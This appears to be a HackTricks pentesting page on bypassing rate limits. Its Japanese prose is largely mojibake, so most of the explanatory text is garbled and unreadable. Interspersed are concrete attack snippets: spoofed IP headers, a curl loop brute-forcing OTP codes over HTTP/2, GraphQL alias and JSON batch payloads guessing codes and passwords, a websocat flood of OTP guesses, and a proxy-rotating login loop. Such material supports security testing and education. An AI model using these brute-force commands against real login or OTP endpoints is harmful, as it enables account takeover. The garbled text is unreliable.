# Rate Limit Bypass

{{#include ../banners/hacktricks-training.md}}

## Rate limit bypass techniques

### Exploring Similar Endpoints

æ¨™çš„ã¨ãªã‚‹ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆä¾‹: `/api/v3/sign-up`ã€`/Sing-up`ã€`/SignUp`ã€`/singup`ã€`/api/v1/sign-up`ã€`/api/sign-up` ãªã©ï¼‰ã«å¯¾ã—ã¦ã€brute force attacks ã‚’è©¦ã¿ã‚‹ã¹ãã§ã™ã€‚

### Incorporating Blank Characters in Code or Parameters

ã‚³ãƒ¼ãƒ‰ã‚„ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã« `%00`ã€`%0d%0a`ã€`%0d`ã€`%0a`ã€`%09`ã€`%0C`ã€`%20` ã®ã‚ˆã†ãªç©ºãƒã‚¤ãƒˆã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã¯æœ‰åŠ¹ãªæ‰‹æ³•ã§ã™ã€‚ä¾‹ãˆã°ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ `code=1234%0a` ã®ã‚ˆã†ã«èª¿æ•´ã™ã‚‹ã¨ã€ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ”¹è¡Œæ–‡å­—ã‚’è¿½åŠ ã™ã‚‹ãªã©å…¥åŠ›ã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã§è©¦è¡Œå›æ•°ã®åˆ¶é™ã‚’å›é¿ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### Manipulating IP Origin via Headers

é€ä¿¡å…ƒIPã‚’å¤‰ãˆã‚‹ãŸã‚ã«ãƒ˜ãƒƒãƒ€ã‚’å¤‰æ›´ã™ã‚‹ã¨ã€IPãƒ™ãƒ¼ã‚¹ã®ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’å›é¿ã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚`X-Originating-IP`ã€`X-Forwarded-For`ã€`X-Remote-IP`ã€`X-Remote-Addr`ã€`X-Client-IP`ã€`X-Host`ã€`X-Forwared-Host` ã¨ã„ã£ãŸãƒ˜ãƒƒãƒ€ï¼ˆ`X-Forwarded-For` ã‚’è¤‡æ•°å›ä½¿ç”¨ã™ã‚‹ãªã©ï¼‰ã‚’èª¿æ•´ã—ã¦ã€ç•°ãªã‚‹IPã‹ã‚‰ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ãƒˆã§ãã¾ã™ã€‚
```bash
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1

# Double X-Forwarded-For header example
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```
### ä»–ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®å¤‰æ›´

user-agent ã‚„ cookies ã®ã‚ˆã†ãªä»–ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚’æ¨å¥¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ã‚¿ãƒ¼ãƒ³ã®è­˜åˆ¥ã‚„è¿½è·¡ã«ä½¿ã‚ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ãƒªã‚¯ã‚¨ã‚¹ã‚¿ãƒ¼ã®æ´»å‹•ã®èªè­˜ã‚„è¿½è·¡ã‚’é˜²ã’ã¾ã™ã€‚

### API Gatewayã®æŒ™å‹•ã‚’åˆ©ç”¨ã™ã‚‹

ä¸€éƒ¨ã® API Gateway ã¯ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¨ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®çµ„ã¿åˆã‚ã›ã«åŸºã¥ã„ã¦ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’é©ç”¨ã™ã‚‹ã‚ˆã†ã«è¨­å®šã•ã‚Œã¦ã„ã¾ã™ã€‚ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å€¤ã‚’å¤‰ãˆãŸã‚Šã€æ„å‘³ã®ãªã„ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€ã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤ã®ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãƒ­ã‚¸ãƒƒã‚¯ã‚’å›é¿ã—ã€å„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä¸€æ„ã«è¦‹ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã° `/resetpwd?someparam=1`ã€‚

### å„è©¦è¡Œå‰ã«ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹

å„è©¦è¡Œã€ã¾ãŸã¯å„è©¦è¡Œã‚»ãƒƒãƒˆã®å‰ã«ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã¨ã€ãƒ¬ãƒ¼ãƒˆãƒªãƒŸãƒƒãƒˆã®ã‚«ã‚¦ãƒ³ã‚¿ãƒ¼ãŒãƒªã‚»ãƒƒãƒˆã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ãƒ­ã‚°ã‚¤ãƒ³æ©Ÿèƒ½ã®ãƒ†ã‚¹ãƒˆæ™‚ã«ç‰¹ã«æœ‰ç”¨ã§ã™ã€‚Burp Suite ã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã§ Pitchfork attack ã‚’åˆ©ç”¨ã—ã€æ•°å›ã”ã¨ã«èªè¨¼æƒ…å ±ã‚’ãƒ­ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã•ã›ã€follow redirects ã‚’æœ‰åŠ¹ã«ã—ã¦ãŠãã“ã¨ã§ã€ãƒ¬ãƒ¼ãƒˆãƒªãƒŸãƒƒãƒˆã®ã‚«ã‚¦ãƒ³ã‚¿ãƒ¼ã‚’åŠ¹æœçš„ã«å†èµ·å‹•ã§ãã¾ã™ã€‚

### ãƒ—ãƒ­ã‚­ã‚·ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®åˆ©ç”¨

ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¤‡æ•°ã® IP ã‚¢ãƒ‰ãƒ¬ã‚¹ã«åˆ†æ•£ã•ã›ã‚‹ãŸã‚ã«ãƒ—ãƒ­ã‚­ã‚·ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’å±•é–‹ã™ã‚‹ã“ã¨ã§ã€IP ãƒ™ãƒ¼ã‚¹ã®ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’åŠ¹æœçš„ã«å›é¿ã§ãã¾ã™ã€‚ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ã•ã¾ã–ã¾ãªãƒ—ãƒ­ã‚­ã‚·çµŒç”±ã§ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã™ã‚‹ã“ã¨ã§ã€å„ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒç•°ãªã‚‹é€ä¿¡å…ƒã‹ã‚‰æ¥ã¦ã„ã‚‹ã‚ˆã†ã«è¦‹ã›ã€ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã®åŠ¹æœã‚’è–„ã‚ã¾ã™ã€‚

### æ”»æ’ƒã‚’åˆ¥ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚„ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«åˆ†æ•£ã™ã‚‹

ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ãŒã‚¢ã‚«ã‚¦ãƒ³ãƒˆæ¯ã‚„ã‚»ãƒƒã‚·ãƒ§ãƒ³æ¯ã«ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’é©ç”¨ã—ã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒã‚„ãƒ†ã‚¹ãƒˆã‚’è¤‡æ•°ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚„ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«åˆ†æ•£ã•ã›ã‚‹ã“ã¨ã§æ¤œçŸ¥ã‚’å›é¿ã—ã‚„ã™ããªã‚Šã¾ã™ã€‚ã“ã®æ–¹æ³•ã¯è¤‡æ•°ã® ID ã‚„ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç®¡ç†ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ãŒã€è¨±å®¹ã•ã‚Œã‚‹åˆ¶é™å†…ã«è² è·ã‚’é…åˆ†ã™ã‚‹ã®ã«åŠ¹æœçš„ã§ã™ã€‚

### è©¦ã—ç¶šã‘ã‚‹

ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãŒå­˜åœ¨ã—ã¦ã„ã¦ã‚‚ã€æ­£ã—ã„ OTP ã‚’é€ä¿¡ã—ãŸã¨ãã«ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒç•°ãªã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã¹ãã§ã™ã€‚In [**this post**](https://mokhansec.medium.com/the-2-200-ato-most-bug-hunters-overlooked-by-closing-intruder-too-soon-505f21d56732)ã€ãƒã‚°ãƒãƒ³ã‚¿ãƒ¼ã¯ã€20 å›ã®å¤±æ•—å¾Œã« 401 ã‚’è¿”ã—ã¦ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãŒç™ºå‹•ã—ã¦ã‚‚ã€æ­£ã—ã„ã‚‚ã®ã‚’é€ã£ãŸå ´åˆã¯ 200 ãŒè¿”ã£ã¦ããŸã“ã¨ã‚’ç™ºè¦‹ã—ã¦ã„ã¾ã™ã€‚

---

### HTTP/2 multiplexing & request pipelining ã®æ‚ªç”¨ (2023-2025)

Modern rateâ€“limiter implementations frequently count **TCP connections** (or even individual HTTP/1.1 requests) instead of the *number of HTTP/2 streams* a connection contains. When the same TLS connection is reused, an attacker can open hundreds of parallel streams, each carrying a separate request, while the gateway only deducts *one* request from the quota.
```bash
# Send 100 POST requests in a single HTTP/2 connection with curl
seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge -X POST \
-H "Content-Type: application/json" \
-d '{"code":"@"}' https://target/api/v2/verify &>/dev/null
```
ãƒªãƒŸãƒƒã‚¿ãƒ¼ãŒ `/verify` ã®ã¿ã‚’ä¿è­·ã—ã€`/api/v2/verify` ã‚’ä¿è­·ã—ã¦ã„ãªã„å ´åˆã€**path confusion** ã¨ HTTP/2 ã® multiplexing ã‚’çµ„ã¿åˆã‚ã›ã‚‹ã“ã¨ã§ã€*æ¥µã‚ã¦* é«˜é€Ÿãª OTP ã‚„ credential brute-forcing ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

> ğŸ¾  **Tip:** PortSwiggerâ€™s [Turbo Intruder](https://portswigger.net/research/turbo-intruder) ã¯ HTTP/2 ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ãŠã‚Šã€`maxConcurrentConnections` ã¨ `requestsPerConnection` ã‚’èª¿æ•´ã—ã¦ã“ã®æ”»æ’ƒã‚’è‡ªå‹•åŒ–ã§ãã¾ã™ã€‚

### GraphQL ã® aliases ã¨ batched operations

GraphQL ã§ã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒ *aliases* ã‚’ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ã¨ã—ã¦ä»˜ã‘ã‚‹ã“ã¨ã§ã€**å˜ä¸€ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§è«–ç†çš„ã«ç‹¬ç«‹ã—ãŸè¤‡æ•°ã® queries ã‚„ mutations ã‚’é€ä¿¡ã§ãã¾ã™**ã€‚ã‚µãƒ¼ãƒãƒ¼ã¯å„ alias ã‚’å®Ÿè¡Œã™ã‚‹ä¸€æ–¹ã§ã€rate-limiter ãŒã—ã°ã—ã° *one* ä»¶ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã—ã‹ã‚«ã‚¦ãƒ³ãƒˆã—ãªã„ãŸã‚ã€ã“ã‚Œã¯ login ã‚„ password-reset ã®ã‚¹ãƒ­ãƒƒãƒˆãƒªãƒ³ã‚°ã‚’å›é¿ã™ã‚‹ä¿¡é ¼ã§ãã‚‹ãƒã‚¤ãƒ‘ã‚¹ã§ã™ã€‚
```graphql
mutation bruteForceOTP {
a: verify(code:"111111") { token }
b: verify(code:"222222") { token }
c: verify(code:"333333") { token }
# â€¦ add up to dozens of aliases â€¦
}
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ç¢ºèªã™ã‚‹ã¨ã€ã¡ã‚‡ã†ã©1ã¤ã®aliasã¯æ­£ã—ã„ã‚³ãƒ¼ãƒ‰ãŒå½“ãŸã£ãŸã¨ãã«200 OKã‚’è¿”ã—ã€ä»–ã¯rate-limitedã•ã‚Œã¾ã™ã€‚

ã“ã®æ‰‹æ³•ã¯PortSwiggerã®ç ”ç©¶ã€ŒGraphQL batching & aliasesã€ã§2023å¹´ã«æ³¨ç›®ã•ã‚Œã€æœ€è¿‘ã®å¤šãã®bug-bounty payoutsã«é–¢ä¸ã—ã¦ã„ã¾ã™ã€‚

### *batch* or *bulk* REST endpoints ã®æ‚ªç”¨

ä¸€éƒ¨ã®APIã¯ã€`/v2/batch` ã®ã‚ˆã†ãªhelper endpointsã‚’å…¬é–‹ã—ãŸã‚Šã€request bodyã§**array of objects**ã‚’å—ã‘å…¥ã‚ŒãŸã‚Šã—ã¾ã™ã€‚ã‚‚ã—limiterãŒ*legacy* endpointsã®å‰ã«ã®ã¿é…ç½®ã•ã‚Œã¦ã„ã‚‹å ´åˆã€è¤‡æ•°ã®æ“ä½œã‚’1ã¤ã®bulk requestã«ã¾ã¨ã‚ã‚‹ã“ã¨ã§ä¿è­·ã‚’å®Œå…¨ã«å›é¿ã—ã¦ã—ã¾ã†å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```json
[
{"path": "/login", "method": "POST", "body": {"user":"bob","pass":"123"}},
{"path": "/login", "method": "POST", "body": {"user":"bob","pass":"456"}}
]
```
### sliding-window ã®ã‚¿ã‚¤ãƒŸãƒ³ã‚°

å¤å…¸çš„ãª token-bucket ã‚„ leaky-bucket limiter ã¯å›ºå®šã®æ™‚é–“å¢ƒç•Œï¼ˆä¾‹ãˆã°æ¯åˆ†ï¼‰ã§ *ãƒªã‚»ãƒƒãƒˆã•ã‚Œã¾ã™*ã€‚ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒæ—¢çŸ¥ã®å ´åˆï¼ˆä¾‹: `X-RateLimit-Reset: 27` ã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‹ã‚‰ï¼‰ã€bucket ãŒãƒªã‚»ãƒƒãƒˆã•ã‚Œã‚‹ **ç›´å‰ã«** è¨±å¯ã•ã‚Œã¦ã„ã‚‹æœ€å¤§æ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ã™ãã«ã‚‚ã†ä¸€åº¦ãƒ•ãƒ«ãƒãƒ¼ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚
```
|<-- 60 s window â€‘->|<-- 60 s window â€‘->|
######                 ######
```
ã“ã®å˜ç´”ãªæœ€é©åŒ–ã«ã‚ˆã‚Šã€ä»–ã® bypass technique ã«æ‰‹ã‚’åŠ ãˆãšã«ã‚¹ãƒ«ãƒ¼ãƒ—ãƒƒãƒˆã‚’2å€ä»¥ä¸Šã«ã§ãã¾ã™ã€‚

### ãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯å¾Œã« WebSockets / gRPC streaming ã¸ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰

å¤šãã® edge rate-limiters ã¯ **initial HTTP request** ã®ã¿ã‚’æ¤œæŸ»ã™ã‚‹ã€‚æ¥ç¶šãŒ WebSocket (HTTP 101) ã¾ãŸã¯ gRPC bidirectional streaming ã«ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã¨ã€ãã®å¾Œã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ã‚‚ã¯ã‚„å€‹åˆ¥ã® HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã¯ãªã„ãŸã‚ã€request-per-second counters ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚Cloudflare ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§ã‚‚ã€åˆå›ã®ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã¿ãŒ WAF/ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãƒ«ãƒ¼ãƒ«ã®å¯¾è±¡ã§ã‚ã‚Šã€ãã®å¾Œã«é€ä¿¡ã•ã‚Œã‚‹ãƒ•ãƒ¬ãƒ¼ãƒ ã¯ä¸é€æ˜ã§ã‚ã‚‹ã¨è¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹ã€‚

å®Ÿè·µçš„ãªãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼:
```bash
# Flood 1,000 OTP guesses through a single WebSocket connection
seq -w 000000 000999 | websocat -n ws://target.tld/api/verify-ws

# gRPC streaming: send multiple Verify requests in one stream
grpcurl -d @ -plaintext target.tld:50051 service.VerifyOTP/Stream <<'EOF'
{ "code": "111111" }
{ "code": "222222" }
{ "code": "333333" }
EOF
```
ã‚‚ã— login/OTP ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆãŒ HTTP ã¨ WebSocket/gRPC ã®ä¸¡æ–¹ã®ãƒãƒªã‚¢ãƒ³ãƒˆã‚’å…¬é–‹ã—ã¦ã„ã‚‹å ´åˆã€ã¾ãšã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒãƒ£ãƒãƒ«ã‚’ç¢ºç«‹ã—ã€ãã®å˜ä¸€ã®æ¥ç¶šå†…ã§ã‚³ãƒ¼ãƒ‰ã‚’é€£ç¶šé€ä¿¡ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã”ã¨ã®ã‚¹ãƒ­ãƒƒãƒˆãƒªãƒ³ã‚°ã‚’å›é¿ã—ã¾ã™ã€‚

### CDN PoPâ€‘sharded counters ã®æ‚ªç”¨

ä¸€éƒ¨ã® CDNs ã¯ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚«ã‚¦ãƒ³ã‚¿ãƒ¼ã‚’ã‚°ãƒ­ãƒ¼ãƒãƒ«ã§ã¯ãªããƒ‡ãƒ¼ã‚¿ã‚»ãƒ³ã‚¿ãƒ¼/PoP ã”ã¨ã«ã‚·ãƒ£ãƒ¼ãƒ‰ã—ã¾ã™ã€‚Cloudflare ã¯ã‚«ã‚¦ãƒ³ã‚¿ãƒ¼ãŒãƒ‡ãƒ¼ã‚¿ã‚»ãƒ³ã‚¿ãƒ¼é–“ã§å…±æœ‰ã•ã‚Œãªã„ã“ã¨ã‚’æ˜ç¤ºã—ã¦ã„ã¾ã™ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¤šåœ°åŸŸã®ã‚¤ã‚°ãƒ¬ã‚¹ãƒãƒ¼ãƒ‰ï¼ˆresidential proxy poolsã€anycast VPNsã€ã¾ãŸã¯ç•°ãªã‚‹å¤§é™¸ã«ãƒ”ãƒ³ç•™ã‚ã—ãŸ cloud VMsï¼‰çµŒç”±ã§ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã™ã‚‹ã“ã¨ã§ã€è¨±å®¹ã‚¹ãƒ«ãƒ¼ãƒ—ãƒƒãƒˆã‚’ä¹—ç®—ã§ãã¾ã™ï¼šå„ PoP ãŒåŒã˜ã‚­ãƒ¼ã«å¯¾ã—ã¦ç‹¬ç«‹ã—ãŸãƒã‚±ãƒƒãƒˆã‚’ç¶­æŒã™ã‚‹ãŸã‚ã§ã™ã€‚

Quick and dirty layout using open proxies (example with `proxychains` + a countryâ€‘rotating list):
```bash
for p in $(cat proxies.txt); do
HTTPS_PROXY=$p curl -s -X POST https://target/api/login -d @payload.json &
done
wait
```
limiter key ãŒã‚¢ã‚«ã‚¦ãƒ³ãƒˆå˜ä½ï¼ˆper-accountï¼‰ã«ãªã£ã¦ã„ãªã„ã“ã¨ã‚’ç¢ºèªã™ã‚‹ã€‚ãã†ãªã£ã¦ã„ã‚‹å ´åˆã¯ user IDs / session tokens ã‚‚ãƒ­ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ã“ã¨ã€‚

---

## ãƒ„ãƒ¼ãƒ«

- [**https://github.com/Hashtag-AMIN/hashtag-fuzz**](https://github.com/Hashtag-AMIN/hashtag-fuzz): header randomisationã€chunked word-listsã€round-robin proxy rotation ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ fuzzing ãƒ„ãƒ¼ãƒ«ã€‚
- [**https://github.com/ustayready/fireprox**](https://github.com/ustayready/fireprox): ä½¿ã„æ¨ã¦ã® AWS API Gateway ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’è‡ªå‹•ã§ä½œæˆã—ã€å„ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒç•°ãªã‚‹ IP ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ç™ºä¿¡ã•ã‚Œã‚‹ã‚ˆã†ã«ã™ã‚‹ â€” IP-based throttling ã‚’å›é¿ã™ã‚‹ã®ã«æœ€é©ã€‚
- **Burp Suite â€“ IPRotate + extension**: SOCKS/HTTP proxiesï¼ˆã¾ãŸã¯ AWS API Gatewayï¼‰ã®ãƒ—ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã€*Intruder* ãŠã‚ˆã³ *Turbo Intruder* æ”»æ’ƒä¸­ã«é€ä¿¡å…ƒ IP ã‚’é€éçš„ã«ãƒ­ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ã€‚
- **Turbo Intruder (BApp)**: HTTP/2 ã® multiplexing ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹é«˜æ€§èƒ½ãª attack engineã€‚`requestsPerConnection` ã‚’ 100â€“1000 ã«èª¿æ•´ã™ã‚‹ã¨ã€æ•°ç™¾ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å˜ä¸€ã®ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ã«ã¾ã¨ã‚ã‚‰ã‚Œã‚‹ã€‚

## å‚è€ƒ

- [PortSwigger Research â€“ â€œBypassing rate limits with GraphQL aliasingâ€ (2023)](https://portswigger.net/research/graphql-authorization-bypass)
- [PortSwigger Research â€“ â€œHTTP/2: The Sequel is Always Worseâ€ (connection-based throttling) (2024)](https://portswigger.net/research/http2)
- [Cloudflare Docs â€“ WebSockets & WAF applicability (2025)](https://developers.cloudflare.com/network/websockets/)
- [Cloudflare Docs â€“ Request rate calculation and PoP-local counters (2025)](https://developers.cloudflare.com/waf/rate-limiting-rules/request-rate/)

{{#include ../banners/hacktricks-training.md}}
